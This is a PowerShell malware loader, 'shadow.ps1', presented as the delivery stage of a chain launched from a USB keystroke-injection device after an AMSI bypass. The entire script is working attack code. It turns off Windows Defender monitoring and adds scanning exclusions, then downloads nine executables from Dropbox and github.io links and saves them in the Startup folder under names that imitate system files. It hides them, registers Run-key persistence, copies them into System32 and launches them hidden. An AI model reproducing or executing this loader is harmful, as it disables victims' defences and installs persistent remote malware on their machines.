# shadow.ps1 - SHADOW CORE - delivery payload
# Ducky -> s.ps1 (AMSI patch) -> shadow.b64 -> payload.ps1 -> delivery

[CmdletBinding()]
param(
    [switch]$Elevated
)

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'

# ====================================================
# CONFIG
# ====================================================

$payloads = @(
    @{ Url = 'https://www.dropbox.com/scl/fi/9d9cvb8bmmjc3d2e2dtxq/winlogon.exe?rlkey=hmmvfm1bzkr5mfas1ubo449a3&st=rnxvwht5&dl=1'; Name = 'winnit.exe';    RegKey = 'explorer'    },
    @{ Url = 'https://infinityteq.github.io/MalwareRemoval.exe';                                                                                    Name = 'system.exe';    RegKey = 'javaupdate'  },
    @{ Url = 'https://www.dropbox.com/scl/fi/vp4sb3ogc8fj3dkhuddhc/PhantomShadow.exe?rlkey=5165cqwgiki50yuqxzh8km6m2&st=wg82kr7q&dl=1';               Name = 'Defender.exe';  RegKey = 'winupdate'   },
    @{ Url = 'https://infinityteq.github.io/WindowsUpdate.exe';                                                                                     Name = 'Windows.exe';   RegKey = 'chrome'      },
    @{ Url = 'https://infinityteq.github.io/chrome.exe';                                                                                            Name = 'updater.exe';   RegKey = 'system'      },
    @{ Url = 'https://infinityteq.github.io/Server.exe';                                                                                            Name = 'lsass.exe';     RegKey = 'winnow'      },
    @{ Url = 'https://infinityteq.github.io/svchost.exe';                                                                                           Name = 'java.exe';      RegKey = 'sys'         },
    @{ Url = 'https://infinityteq.github.io/winupdate.exe';                                                                                         Name = 'explorer.exe';  RegKey = 'winlogon'    },
    @{ Url = 'https://infinityteq.github.io/activatorfl.exe';                                                                                       Name = 'iexplorer.exe'; RegKey = 'systemupdate' }
)

$userStartup   = [Environment]::GetFolderPath('Startup')
$tempDir       = $env:TEMP

# ====================================================
# PHASE 1 - DISABLE DEFENDER (best effort, works only if elevated)
# ====================================================

try {
    Add-MpPreference -ExclusionPath $userStartup   -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:SystemRoot\System32" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:SystemRoot\SysWOW64" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $tempDir       -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension 'exe'     -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring         $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring        $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning            $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen          $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection            $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableArchiveScanning           $true -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
} catch {}

# ====================================================
# PHASE 2 - DOWNLOAD + EXECUTE PAYLOADS
# ====================================================

function Invoke-Download {
    param($Entry)

    $dest = Join-Path $userStartup $Entry.Name
    $ok = $false

    for ($i = 0; $i -lt 3 -and -not $ok; $i++) {
        try {
            Invoke-WebRequest -Uri $Entry.Url -OutFile $dest -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
            if (Test-Path $dest) { $ok = $true }
        } catch {
            Start-Sleep -Seconds 2
        }
    }
    if (-not $ok) { return }

    try { (Get-Item $dest).Attributes = 'Hidden,System' } catch {}

    # Per-payload HKCU Run key (works at medium IL)
    $rk = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    try {
        if (-not (Get-ItemProperty -Path $rk -Name $Entry.RegKey -ErrorAction SilentlyContinue)) {
            New-ItemProperty -Path $rk -Name $Entry.RegKey -Value "`"$dest`"" -PropertyType String -Force | Out-Null
        }
    } catch {}

    # Try to also mirror to System32 (works only if elevated)
    try {
        Copy-Item $dest "$env:SystemRoot\System32\$($Entry.Name)" -Force -ErrorAction SilentlyContinue
        if (Test-Path "$env:SystemRoot\System32\$($Entry.Name)") {
            (Get-Item "$env:SystemRoot\System32\$($Entry.Name)").Attributes = 'Hidden,System'
        }
    } catch {}

    # Execute. Payload handles its own persistence + elevation.
    try {
        Start-Process -FilePath $dest -WindowStyle Hidden
    } catch {}
}

foreach ($p in $payloads) { Invoke-Download $p }

# ====================================================
# PHASE 3 - QUIET EXIT
# ====================================================
# No monitor loop, no persistent process. The delivered payloads
# are the persistence. This loader's job ends when they're running.

exit 0